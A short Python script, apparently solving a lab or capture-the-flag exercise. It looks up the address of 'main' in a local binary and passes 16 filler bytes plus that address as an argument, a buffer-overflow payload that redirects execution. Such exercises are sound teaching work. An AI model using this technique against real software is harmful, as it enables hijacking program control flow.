import subprocess

binary = './entry_callback'
symbols = subprocess.check_output(['nm', binary], text=True)
address = next(
    int(line.split()[0], 16)
    for line in symbols.splitlines()
    if line.split()[-1] == 'main'
)
print(address.to_bytes(8, 'little').hex())
payload = b'A' * 16 + address.to_bytes(8, 'little').rstrip(b'\0')
subprocess.run([binary, payload], check=True)
